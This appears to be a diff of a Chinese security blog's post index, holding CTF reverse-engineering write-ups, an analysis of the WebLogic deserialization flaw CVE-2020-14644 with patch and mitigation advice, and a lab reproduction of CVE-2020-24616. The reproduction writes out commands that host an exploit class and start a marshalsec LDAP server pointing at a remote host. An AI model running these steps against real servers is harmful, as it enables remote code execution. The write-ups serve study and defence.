-<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201110180421766.png" alt="image-20201110180421766"></p>
-<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201110180133377.png" alt="image-20201110180133377"></p>
-<p>问题：</p>
-<p>python3一直无法导入gmpy2的包，只能用python2写了</p>
-<h5 id="0x03-igniteme"><a href="#0x03-igniteme" class="headerlink" title="0x03 igniteme"></a>0x03 igniteme</h5><p>ida分析，主函数如下：</p>
-<p>可以看到前四位和最后一位是定的，对v7做一个sub_4011C0函数的判断</p>
-<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201110164753556.png" alt="image-20201110164753556"></p>
-<p>跟进函数看看：</p>
-<p>把值给了v8，然后v8经过一些操作变成v4，v4和最后的字符串相同</p>
-<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201110164900645.png" alt="image-20201110164900645"></p>
-<p>查看unk_4420B0和sub_4013C0</p>
-<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201110161046021.png" alt="image-20201110161046021"></p>
-<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201110161059343.png" alt="image-20201110161059343"></p>
-<p>编写脚本如下即可，然后转一下大小写</p>
-<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201110165109839.png" alt="image-20201110165109839"></p>
-<h5 id="0x04-hackme（-amp-0xff）"><a href="#0x04-hackme（-amp-0xff）" class="headerlink" title="0x04 hackme（&amp;0xff）"></a>0x04 hackme（&amp;0xff）</h5><p>ida分析，找到主函数，分析一下就是，输入字符串，长度为22位，然后抽取其中的10位进行检验（可以看到数组byte_6B4270是22位的），检验方法就是v9和输入的字符串进行异或后要和固定的数组内容相同</p>
-<p><strong>注意：循环10次不代表字符串只有10位</strong></p>
-<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201110182250771.png" alt="image-20201110182250771"></p>
-<p>查看byte_6B4270的内容</p>
-<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201110182511109.png" alt="image-20201110182511109"></p>
-<p>可以编写脚本如下：</p>
-<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201111111154246.png" alt="image-20201111111154246"></p>
-<p>要注意的是，v1[i]的值很大，需要和0xff相与，0xff最大值是255，由于整数值超过了255，所以用来控制</p>
-<h5 id="0x05-ReverseMe"><a href="#0x05-ReverseMe" class="headerlink" title="0x05 ReverseMe"></a>0x05 ReverseMe</h5><p>ida分析：</p>
-<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201111143110520.png" alt="image-20201111143110520"></p>
-<h5 id="0x06-easyre1"><a href="#0x06-easyre1" class="headerlink" title="0x06 easyre1"></a>0x06 easyre1</h5><p>打开ida就能看到，提交即可</p>
-<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201113115339027.png" alt="image-20201113115339027"></p>
-<h5 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h5><p><img src="/Users/kami/Desktop/hexo/source/_posts/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201113174747214.png" alt="image-20201113174747214"></p>
-<h5 id="0x08-easyhook（hook）"><a href="#0x08-easyhook（hook）" class="headerlink" title="0x08 easyhook（hook）"></a>0x08 easyhook（hook）</h5><p>主函数，关键函数为sub_401220和sub_401240，然后创建了一个文件</p>
-<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201116134415789.png" alt="image-20201116134415789"></p>
-<p>运行一下，发现输入的字符串被改变了：</p>
-<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201116141148468.png" alt="image-20201116141148468"></p>
-<p>动态调试一下，发现确实在这里写入的输入字符串被改变了</p>
-<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201116141519684.png" alt="image-20201116141519684"></p>
-<p>401220:点进4010D0看看</p>
-<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201116134620725.png" alt="image-20201116134620725"></p>
-<p>4010D0:</p>
-<p>Virtualprotectex修改了指定进程，hprocess和lpaddress是要更改的进程的句柄和页面区域的基地址的指针，5是访问保护属性已更改的区域的大小，以字节为单位。</p>
-<p>Writeprocessmemory写入了指定数据，byte_40C9BC是指向缓冲区的指针，该缓冲区包含要在指定进程的地址空间中写入的数据。5是写入的数据大小</p>
-<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201116134806821.png" alt="image-20201116134806821"></p>
-<p>返回401220看看是怎么修改的</p>
-<p>byte_40C9BC是0xE9，但是这只有一个字节，所以后四个字节就是40C9BD的内容，40C9BD和401080有关</p>
-<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201116142056410.png" alt="image-20201116142056410"></p>
-<p>401080:调用了sub_401000,lpbuffer指向包含要写入文件或设备的数据的缓冲区的指针。同时，真正flag的判定条件numer==1也是这里决定的</p>
-<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201116142205966.png" alt="image-20201116142205966"></p>
-<p>401000:可以看到对a1进行的操作，编写脚本即可</p>
-<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201116142459347.png" alt="image-20201116142459347"></p>
-<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201116154606478.png" alt="image-20201116154606478"></p>
-<p>401240:并没有什么作用</p>
-<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201116134559636.png" alt="image-20201116134559636"></p>
-<h5 id="0x09-secret-string-400（js）"><a href="#0x09-secret-string-400（js）" class="headerlink" title="0x09 secret-string-400（js）"></a>0x09 secret-string-400（js）</h5><p>打开看是一个html和一个js文件，之前没接触过</p>
-<p>打开html，是一个验证输入页面，随便输入一个字符串，会弹出nope</p>
-<p>搜索了下怎么调试js，开始尝试在代码各处里加入console.log，然后f12查看输出情况</p>
-<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201116171456917.png" alt="image-20201116171456917"></p>
-<p>然后页面中出现了隐藏的代码：</p>
-<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201116170210757.png" alt="image-20201116170210757"></p>
-<p>根据这个代码写出脚本即可：</p>
-<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201116171607888.png" alt="image-20201116171607888"></p>
-<h5 id="0x0A-easymaze"><a href="#0x0A-easymaze" class="headerlink" title="0x0A easymaze"></a>0x0A easymaze</h5><p>ida分析主函数</p>
-<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201116172904202.png" alt="image-20201116172904202"></p>
-<p>由于分析两个step函数比较复杂，且容易分析错，可以动态调试(linux下的远程动态调试)找出生成的迷宫，下断点，找v5的位置</p>
-<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201117091836672.png" alt="image-20201117091836672"></p>
-<p>再看step2，告诉我们怎么走</p>
-<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201117092345267.png" alt="image-20201117092345267"></p>
-<p>根据迷宫走即可</p>
-<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201117092811994.png" alt="image-20201117092811994"></p>
-<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201117092755620.png" alt="image-20201117092755620"></p>
-<h5 id="0x0B-reverse-reverse-for-the-holy-grail"><a href="#0x0B-reverse-reverse-for-the-holy-grail" class="headerlink" title="0x0B reverse reverse-for-the-holy-grail"></a>0x0B reverse reverse-for-the-holy-grail</h5><p>ida分析，可以看到v4的值是判定条件，跟进stringmod看看</p>
-<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201117160814789.png" alt="image-20201117160814789"></p>
-<p>stringmod:是一大堆函数，理解一下</p>
-<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201117160928953.png" alt="image-20201117160928953"></p>
-<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201117161027159.png" alt="image-20201117161027159"></p>
-<p>编写脚本：</p>
-<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201117160731736.png" alt="image-20201117160731736"></p>
-<h5 id="0x0C-serial-150（动态调试）"><a href="#0x0C-serial-150（动态调试）" class="headerlink" title="0x0C serial-150（动态调试）"></a>0x0C serial-150（动态调试）</h5><p>ida动态调试：</p>
-<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201117180507650.png" alt="image-20201117180507650"></p>
-<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/8F5E6F84-02A8-4523-874E-03A0F3AA1C02.png" alt="8F5E6F84-02A8-4523-874E-03A0F3AA1C02"></p>
-<p>看到比较长度的代码，10h，所以长度为16</p>
-<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/915BC464-5DEA-4841-9715-7CACBA9B7E68.png" alt="915BC464-5DEA-4841-9715-7CACBA9B7E68"></p>
-<p>比较第一个字符，所以第一个字符是E</p>
-<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/97BED366-6105-4D26-A4E7-6808DAF3C544.png" alt="97BED366-6105-4D26-A4E7-6808DAF3C544"></p>
-<p>第一个字符加上最后一个字符为9B，所以最后一个字符是V(9B-45=56的ascii码)</p>
-<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/23F762B1-FEB7-48EA-920E-F7F852E166D3.png" alt="23F762B1-FEB7-48EA-920E-F7F852E166D3"></p>
-<p>第二位是5A,即Z</p>
-<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201117180907737.png" alt="image-20201117180907737"></p>
-<p>第二位和倒数第二位加起来还是9B,倒数第二位是A</p>
-<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201117181154507.png" alt="image-20201117181154507"></p>
-<p>按理类推即可：EZ9dmq4c8g9G7bAV</p>
-<h5 id="0x0D-babymips（mips-位运算符）"><a href="#0x0D-babymips（mips-位运算符）" class="headerlink" title="0x0D babymips（mips,位运算符）"></a>0x0D babymips（mips,位运算符）</h5><p>下载了一个软件用来反汇编mips</p>
-<p>就很清楚了。先比较前五个字符，然后在FUN_004007f0里比较后面的</p>
-<p>注意：-的优先级大于^</p>
-<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201120083337582.png" alt="image-20201120083337582"></p>
-<p>进入函数查看，重点其实就是 b = (a&lt;&lt;0x1a)&gt;&gt;0x18 | a &gt;&gt;6这两句，现在已知b，求a</p>
-<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201120083511211.png" alt="image-20201120083511211"></p>
-<p>注意：&lt;&lt;和&gt;&gt;操作是32位的，优先级大于｜</p>
-<p>因为a肯定是字符，所以1只会出现在后8位，b也是字符，</p>
-<p>那么(a&lt;&lt;0x1a)&gt;&gt;0x18的操作就相当于在原来的后面加两个0，即a&lt;&lt;2</p>
-<p>b = a&lt;&lt;2|a&gt;&gt;6</p>
-<p>同时byte（8位）对整个式子做了限制（强制转换时计算机只保留其后8位），uint和int修饰第一个式子</p>
-<p>所以这个式子需要这样理解：</p>
-<p>a&lt;&lt;2，即高两位消失，低两位变0</p>
-<p>a&gt;&gt;6，即低六位消失，高两位变成低两位</p>
-<p>即循环位移</p>
-<p>例如：a =  10100011 </p>
-<p>1010001100|0000010 = 1010001110 -&gt;10001110 = b</p>
-<p>所以我们的a可以这样用b来表示</p>
-<p>a = (b &amp; 00000011(0x3) )&lt;&lt;6|(b &amp; 11111100(0xfc))&gt;&gt;2</p>
-<p>或者a = (byte)(b&lt;&lt;6|b&gt;&gt;2)</p>
-<p>编写脚本如下：</p>
-<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201120095913785.png" alt="image-20201120095913785"></p>
-]]></content>
-      <categories>
-        <category>ctf</category>
-      </categories>
   </entry>
   <entry>
     <title>0x03Xctf进阶刷题-1</title>
@@ -629,64 +521,216 @@
       </categories>
   </entry>
   <entry>
-    <title>0x03CVE-2020-14644 weblogic iiop反序列化漏洞分析</title>
-    <url>/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
-    <content><![CDATA[<h3 id="CVE-2020-14644-weblogic-iiop反序列化漏洞分析"><a href="#CVE-2020-14644-weblogic-iiop反序列化漏洞分析" class="headerlink" title="CVE-2020-14644 weblogic iiop反序列化漏洞分析"></a>CVE-2020-14644 weblogic iiop反序列化漏洞分析</h3><p>参考：</p>
-<p>0x1 <a href="https://my.oschina.net/u/4280983/blog/4477476">https://my.oschina.net/u/4280983/blog/4477476</a></p>
-<p>0x2 宽字节的推文</p>
+    <title>0x04CVE-2020-24616复现</title>
+    <url>/2020/09/09/0x04CVE-2020-24616%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h4 id="CVE-2020-24616复现"><a href="#CVE-2020-24616复现" class="headerlink" title="CVE-2020-24616复现"></a>CVE-2020-24616复现</h4><p>预警参考链接：<a href="https://s.tencent.com/research/bsafe/1102.html">https://s.tencent.com/research/bsafe/1102.html</a></p>
+<p>8月底爆出的新漏洞，分析可参考:<a href="https://mp.weixin.qq.com/s/IICSnsSgwsjnbImgVP-y5g">https://mp.weixin.qq.com/s/IICSnsSgwsjnbImgVP-y5g</a></p>
 <a id="more"></a>
 
-<h4 id="0x1-漏洞介绍"><a href="#0x1-漏洞介绍" class="headerlink" title="0x1 漏洞介绍"></a>0x1 漏洞介绍</h4><h5 id="0x01-WebLogic组件"><a href="#0x01-WebLogic组件" class="headerlink" title="0x01 WebLogic组件"></a>0x01 WebLogic组件</h5><p>WebLogic是美国Oracle公司出品的一个application server，是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器，适用于云环境和传统环境的应用服务器组件。</p>
-<h5 id="0x02-漏洞简介"><a href="#0x02-漏洞简介" class="headerlink" title="0x02 漏洞简介"></a>0x02 漏洞简介</h5><p>Oracle官方在2020年7月份发布的最新安全补丁中披露了此漏洞。此漏洞CVSS评分9.8，<strong>受影响的版本是12.2.1.3.0、12.2.1.4.0和14.1.1.0.0</strong>。该漏洞允许未经身份验证的攻击者通过 IIOP , T3 进行网络访问，攻击者成功攻击此漏洞可能导致Oracle WebLogic Server被接管。</p>
-<h4 id="0x2-漏洞分析"><a href="#0x2-漏洞分析" class="headerlink" title="0x2 漏洞分析"></a>0x2 漏洞分析</h4><h5 id="0x01-相关知识"><a href="#0x01-相关知识" class="headerlink" title="0x01 相关知识"></a>0x01 相关知识</h5><h6 id="JDK的classloader类和defineClass方法"><a href="#JDK的classloader类和defineClass方法" class="headerlink" title="JDK的classloader类和defineClass方法"></a>JDK的classloader类和defineClass方法</h6><p>​    一个类在被使用之前，会经历class文件生成—&gt;加载—&gt;连接—&gt;初始化等阶段。其中加载阶段主要完成三件事：1、通过类的全限定名来获取定义次类的二进制字节流，2、将该二进制字节流定义的静态数据结构转换成方法区的运行时数据结构，3、在内存中生成一个代表该类的Class对象，供外部通过该对象来获取类的元数据信息。</p>
-<p>​    JDK中的ClassLoader类中有个方法是defineClass，可以根据类全限定名和类的字节数组，加载一个类并返回对应的Class对象到 JVM（Java Virtual Machine）中。</p>
-<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201015110556771.png" alt="image-20201015110556771"></p>
-<p>如上图所示，如果参数’name’（类名）和’b’（类文件的二进制数据）可控，理论上我们可以加载任何类，我们可以通过该方法，构造符合class格式的bytes数组作为类去加载。（注意：1、一般情况下，通过defineClass加载的类不允许同名，2、一个类中的类名name和类字节数组b中的类名要对应）</p>
-<h6 id="javassist"><a href="#javassist" class="headerlink" title="javassist"></a>javassist</h6><p>​    javassist是一个开源的分析、编辑和创建Java字节码的类库。它提供了更高级的API，执行效率相对ASM较差，但无需掌握字节码指令的知识，对使用者要求较低。它直接使用java编码的形式，不需要了解虚拟机指令，就能动态改变类的结构，或者动态生成类。</p>
-<h5 id="0x02-漏洞代码分析"><a href="#0x02-漏洞代码分析" class="headerlink" title="0x02 漏洞代码分析"></a>0x02 漏洞代码分析</h5><p>该漏洞的原理是在反序列化时，通过使用defineClass方法，加载恶意类。</p>
-<p>关键类：com.tangosol.internal.util.invoke.RemoteConstructor</p>
-<p>在RemoteConstructor类中，构造实例的代码如下：</p>
-<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201014111222573.png" alt="image-20201014111222573"></p>
-<p>其中RemotableSupport类，可以理解为是coherence自定义的Classloader，在其中实现了defineClass，具有加载类的功能。查看其中的realize方法：</p>
-<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201015110307308.png" alt="image-20201015110307308"></p>
-<p>先执行this.registerIfAbsent(constructor.getDefinition())方法</p>
-<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201015110341915.png" alt="image-20201015110341915"></p>
-<p>RemotableSupport中定义了 Map 类型的 f_mapDefinitions 的变量充当缓存，每次调用realize时就会先在缓存中查找ClassDefinition。</p>
-<p>执行完成后，调用getRemotableClass方法，获取clz。查看ClassDefinition类</p>
-<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201014112030482.png" alt="image-20201014112030482"></p>
-<p>可以看到getRemotableClass返回m_clz,并且m_clz是用transient修饰的（transient的含义：将不需要序列化的属性前添加关键字transient，序列化对象的时候，这个属性就不会被序列化，最终变量为NULL）</p>
-<p>所以clz为NULL。于是在realize方法中，就会进入if分支，调用defineClass加载恶意类字节码。</p>
-<p>RemotableSupport 继承了ClassLoader，所以它的 defineClass 就是调用了父类的 defineClass来加载类。</p>
-<p>需要注意的是BinClassName变量的命名，使用的是ClassIdentity类中的getName方法</p>
-<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201015110410957.png" alt="image-20201015110410957"></p>
-<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201015110448486.png" alt="image-20201015110448486"></p>
-<p>ClassIdentity类中的构造方法是将clazz作为参数，然后提取该类的一些特征信息，如Basename等。其中getName函数可以简化为：getName() = package + “/“ + baseName + “$” + version</p>
-<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201014105230694.png" alt="image-20201014105230694"></p>
-<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201014105430256.png" alt="image-20201014105430256"></p>
-<p>所以 ClassIdentity 中的字节数组 byte[] 中的对应的 Class 的类名必须为 package + “.” + baseName + “$” + version，否则可能会加载失败。</p>
-<p>继续分析realize方法，加载类之后调用了createInstance方法</p>
-<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201014152406910.png" alt="image-20201014152406910"></p>
-<p>aoArgs作为参数进行实例化对象，所以将恶意代码写在构造方法中，实例化之后就会执行恶意代码。</p>
-<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201015110636109.png" alt="image-20201015110636109"></p>
-<p> 所以只要构造一个带有包名类的恶意代码写进构造函数中，通过 javassist动态修改类名，将原类名加上 $ 和 version 值对应，通过iiop协议和反序列化发送给weblogic服务器，即可实现漏洞利用</p>
-<h4 id="0x3-漏洞复现"><a href="#0x3-漏洞复现" class="headerlink" title="0x3 漏洞复现"></a>0x3 漏洞复现</h4><h5 id="0x01-漏洞利用-弹计算器"><a href="#0x01-漏洞利用-弹计算器" class="headerlink" title="0x01 漏洞利用-弹计算器"></a>0x01 漏洞利用-弹计算器</h5><p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201015110723660.png" alt="image-20201015110723660"></p>
-<h5 id="0x02-漏洞利用-信息回显"><a href="#0x02-漏洞利用-信息回显" class="headerlink" title="0x02 漏洞利用-信息回显"></a>0x02 漏洞利用-信息回显</h5><p>1、开启weblogic服务器</p>
-<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201015110854978.png" alt="image-20201015110854978"></p>
-<p>2、查看weblogic服务器的网络配置信息</p>
-<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201015110937437.png" alt="image-20201015110937437"></p>
-<p>3、在攻击机上，编写特制的恶意类（写入weblogic服务器的Ip和weblogic服务的端口以及攻击命令），打包jar包，运行，就可以直接获取到weblogic服务器的信息</p>
-<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201109171158094.png" alt="image-20201109171158094"></p>
-<h4 id="0x4-漏洞防护方案"><a href="#0x4-漏洞防护方案" class="headerlink" title="0x4 漏洞防护方案"></a>0x4 漏洞防护方案</h4><h5 id="0x01-官方方案："><a href="#0x01-官方方案：" class="headerlink" title="0x01 官方方案："></a>0x01 官方方案：</h5><p>官方已经针对此漏洞发布补丁，请受影响的用户参考以下链接安装补丁更新：</p>
-<p><a href="https://www.oracle.com/security-alerts/cpujul2020.html">https://www.oracle.com/security-alerts/cpujul2020.html</a></p>
-<h5 id="0x02-临时解决方案："><a href="#0x02-临时解决方案：" class="headerlink" title="0x02 临时解决方案："></a>0x02 临时解决方案：</h5><h6 id="关闭IIOP协议："><a href="#关闭IIOP协议：" class="headerlink" title="关闭IIOP协议："></a>关闭IIOP协议：</h6><p>在WebLogic控制台中，选择“服务”-&gt;”AdminServer”-&gt;”协议”，取消“启用IIOP”的勾选。并重启WebLogic项目，使配置生效。</p>
-<h6 id="控制T3服务："><a href="#控制T3服务：" class="headerlink" title="控制T3服务："></a>控制T3服务：</h6><p>在WebLogic界面中选择安全-筛选器，在下方出现的界面中找到“连接筛选器”，在里面输入：security.net.ConnectionFilterImpl，然后在连接筛选器规则中输入：127.0.0.1 * * allow t3 t3s，0.0.0.0/0 * * deny t3 t3s。最后保存并重启服务器即可生效。</p>
+<p>参考CVE-2020-8840的复现流程，编写Poc，实现此漏洞复现</p>
+<p>0x1 搭建一个Java项目，新建一个Poc类，下载并导入存在漏洞的包</p>
+<img src="/2020/09/09/0x04CVE-2020-24616%E5%A4%8D%E7%8E%B0/image-20200904171250748.png" alt="image-20200904171250748" style="zoom:50%;">
+
+<p>0x2 可以直接本地充当服务端，也可使用另一台在同一局域网下的电脑充当服务端，两种方式经实验皆可成功复现，在此记录后者</p>
+<p>编写exploid文件：</p>
+<p><img src="/2020/09/09/0x04CVE-2020-24616%E5%A4%8D%E7%8E%B0/image-20200904171609352.png" alt="image-20200904171609352"></p>
+<p>这个操作是在Mac电脑下弹出计算器（注意：calculator.app的路径需根据实际情况填写）</p>
+<p>对此java文件进行javac操作生成exploid.class，放到服务端上</p>
+<p>开启服务端：</p>
+<p>python3 -m http.server 8888</p>
+<p>查看本机Ip后用python启动服务端（注意：python开启时要和exploid.class文件在同一文件夹下</p>
+<p>启动LDAP：</p>
+<p>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer “<a href="http://x.x.x.x(服务端ip):8888/#Exploit&quot;">http://x.x.x.x(服务端Ip):8888/#Exploit&quot;</a> 9999</p>
+<p>本机编写POC文件（java菜鸟写了好久才写出来poc</p>
+<p><img src="/2020/09/09/0x04CVE-2020-24616%E5%A4%8D%E7%8E%B0/image-20200904173651117.png" alt="image-20200904173651117"></p>
+<p>运行POC文件,成功弹出计算器，此时服务端也有记录</p>
+<p><img src="/2020/09/09/0x04CVE-2020-24616%E5%A4%8D%E7%8E%B0/image-20201109172340274.png" alt="image-20201109172340274"></p>
 ]]></content>
       <categories>
         <category>漏洞复现</category>
       </categories>
       <tags>
-        <tag>weblogic</tag>
+        <tag>jackson</tag>
+        <tag>反序列化</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>0x04Xctf进阶刷题-2-更新中</title>
+    <url>/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/</url>
+    <content><![CDATA[<p>XCTF进阶刷题-2</p>
+<a id="more"></a>
+
+<h5 id="0x01-666"><a href="#0x01-666" class="headerlink" title="0x01 666"></a>0x01 666</h5><p>IDA分析</p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201103174113594.png" alt="image-20201103174113594"></p>
+<p>进入encode去看具体的加密操作，是几个异或操作，然后3个字符一组</p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201103174237818.png" alt="image-20201103174237818"></p>
+<p>编写脚本，flag就出来了</p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201103174322010.png" alt="image-20201103174322010"></p>
+<h5 id="0x02-signin-rsa算法"><a href="#0x02-signin-rsa算法" class="headerlink" title="0x02 signin-rsa算法"></a>0x02 signin-rsa算法</h5><p>rsa相关知识：</p>
+<p><a href="https://www.52pojie.cn/thread-1100545-1-1.html">https://www.52pojie.cn/thread-1100545-1-1.html</a></p>
+<p>ida查看主函数，根据算法特征得知是rsa算法</p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201110143659748.png" alt="image-20201110143659748"></p>
+<p>以下函数的作用是将输入字符串转为十六进制ascii码字符串：</p>
+<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201110144019734.png" alt="image-20201110144019734"></p>
